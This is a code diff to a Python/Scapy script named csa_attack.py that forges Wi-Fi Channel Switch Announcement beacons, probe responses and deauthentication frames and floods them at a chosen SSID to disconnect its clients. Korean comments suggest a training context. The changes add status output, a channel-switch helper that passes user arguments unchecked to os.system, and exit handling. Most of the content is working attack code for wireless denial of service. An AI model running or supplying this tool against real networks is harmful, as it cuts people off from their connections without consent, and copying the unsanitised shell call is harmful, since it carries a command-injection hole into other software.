@@ -11,8 +11,14 @@ csa_packets = []
 deauth_packets = []
 conf.verb=0
 
+ALGO_OPEN_AUTH = 0  # OPN
+START_SEQNUM = 1  # sequence number
+SYSTEM_STR = "[\x1b[36m*\x1b[0m]"
+WARN_STR = "[\x1b[31m!\x1b[0m]"
+INFO_STR = "\x1b[33m-\x1b[0m"
+
 ##################################################################################################
-#						usage
+#											usage
 # aggressive를 True로 놓고 쓰는게 좋음
 # broadcast(beacon frame) CSA Attack
 # python3 csa_attack.py -i mon0 -v KITRI_DEV5 -d broadcast --aggressive True
@@ -21,6 +27,8 @@ conf.verb=0
 ##################################################################################################
 
 def csa_attack(parser):
+    #channel switch
+	channel_switch(parser)
 	#Broadcast CSA Attack
 	if is_broadcast(parser):
 		while not len(csa_packets):
@@ -45,9 +53,9 @@ def is_broadcast(parser):
 	else:
 		return False
 
-###############################################################
-#					Beacon 관련 함수들
-###############################################################
+##################################################################################################
+#									Beacon 관련 함수들
+##################################################################################################
 
 def stop_filter_beacon(packet):
 	if packet.haslayer(Dot11Beacon):
@@ -55,7 +63,7 @@ def stop_filter_beacon(packet):
 		dot11 = packet.getlayer(Dot11)
 		beacon = packet.getlayer(Dot11Beacon)
 		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
-			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
+			print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % dot11.addr3)
 			mac_list.append(dot11.addr3)
 			make_beacon_csa(parser, elt, dot11)
 
@@ -78,6 +86,7 @@ def make_beacon_csa(parser, elt, dot11):
 	csa_packets.append(frame)
 
 def send_beacon_csa_t(parser, frame):
+	printProgressBar()
 	if parser.aggressive == True:
 		sendp(frame, iface=parser.interface, inter=0.0004, loop=1)
 	else:
@@ -89,9 +98,9 @@ def send_beacon_csa(parser):
 		t.start()
 
 
-###############################################################
-#					Probe Response관련 함수들
-###############################################################
+##################################################################################################
+#									Probe Response관련 함수들
+##################################################################################################
 
 def stop_filter_probe(packet):
 	if packet.haslayer(Dot11Beacon):
@@ -99,7 +108,7 @@ def stop_filter_probe(packet):
 		dot11 = packet.getlayer(Dot11)
 		beacon = packet.getlayer(Dot11Beacon)
 		if elt.info == bytes(parser.ssid,'utf-8') and dot11.addr3 not in mac_list:
-			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
+			print("\t"+INFO_STR+" Access Point MAC Address (BSSID) : %s" % dot11.addr3)
 			mac_list.append(dot11.addr3)
 			make_probe_csa(parser, dot11)
 	return False
@@ -139,10 +148,26 @@ def send_deauth():
 		for deauth in deauth_packets:
 			sendp(deauth, iface=parser.interface, count = 6)
 
+##################################################################################################
+#											기타 함수
+##################################################################################################
 
-###############################################################
-#						Parser 설정
-###############################################################
+def channel_switch(parser):
+    print(WARN_STR+" Channel Switching : Ch."+str(parser.channel))
+    os.system('iwconfig ' + parser.interface + ' channel ' + str(parser.channel))
+
+def show_info(parser):
+    print(SYSTEM_STR+" Information")
+    print("\t"+INFO_STR+" SSID Information : %s" % parser.ssid)
+    print("\t"+INFO_STR+" Channel : Ch.%s" % parser.channel)
+    print("\t"+INFO_STR+" Interface : %s" % parser.interface)
+
+def printProgressBar():
+    print("\x1b[36m->\x1b[0m",end="",flush=True)
+    
+##################################################################################################
+#											Parser 설정
+##################################################################################################
 
 class PARSER:
 	def __init__(self, opts):
@@ -181,9 +206,10 @@ class PARSER:
 				return ch
 			else:
 				print("Invalid Channel Given.")
+				exit(-1)
 		else:
 			print("No Channel Given")
-			#exit(-1)
+			exit(-1)
 	
 	def interface(self, iface):
 		def getNICnames():
@@ -243,5 +269,5 @@ if __name__ == '__main__':
 
 	options = parser.parse_args()
 	parser = PARSER(options)
-
+	show_info(parser)
 	csa_attack(parser)
